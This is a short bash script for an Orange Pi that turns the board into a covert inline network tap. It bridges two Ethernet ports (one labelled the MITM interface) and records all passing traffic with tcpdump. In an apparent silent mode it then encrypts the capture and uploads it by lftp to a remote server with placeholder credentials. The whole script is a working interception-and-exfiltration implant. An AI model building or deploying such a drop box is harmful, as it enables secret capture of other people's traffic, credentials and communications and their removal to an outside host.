#!/bin/bash
#
# Start capture on boot and upload the result to sftp server
# $1 param - working directory
#

USERDIR=$1

GPGID=00112233
SFTPSRV=remoteserver
SFTPCREDS=username,password
BCAPTURETIME=300
PINUPLOAD=5
INETIF=eth0
MITMIF=eth1
SHUTDOWN=0

source $USERDIR/config.txt
cd $USERDIR/bridge-sniff

service network-manager stop
killall wpa_supplicant
killall dhclient

gpio mode $PINUPLOAD in

brctl addbr br0
brctl addif br0 $INETIF
brctl addif br0 $MITMIF
ifconfig br0 0.0.0.0 up

stamp=`date +%Y%m%d-%H%M%S`
file=capture-$stamp.pcap

# start capture
echo "default-on" > /sys/class/leds/orangepi\:red\:status/trigger
echo "default-on" > /sys/class/leds/orangepi\:green\:pwr/trigger

tcpdump -i br0 -s 0 -w $file &
sleep $BCAPTURETIME
killall -w tcpdump

# start upload
echo "heartbeat" > /sys/class/leds/orangepi\:red\:status/trigger
echo "heartbeat" > /sys/class/leds/orangepi\:green\:pwr/trigger

# check input pin for silent mode
# if jumper is set - bridge will request DHCP and upload
pinstatus=`gpio read $PINUPLOAD`
if [ "$pinstatus" == "0" ]
then
	dhclient br0
	gzip $file
	gpg --encrypt -r $GPGID $file.gz
	timeout="set net:timeout 30"
	retry="set net:max-retries 1"
	tls="set ftp:ssl-auth TLS"
	lftp -e "$timeout; $retry; $tls; put $file.gz.gpg; bye" $SFTPSRV -u $SFTPCREDS
fi

# idle
echo "default-on" > /sys/class/leds/orangepi\:green\:pwr/trigger
echo "heartbeat" > /sys/class/leds/orangepi\:red\:status/trigger

# shutdown when finished
if [ "$SHUTDOWN" != "0" ]
then
	shutdown -h now
fi

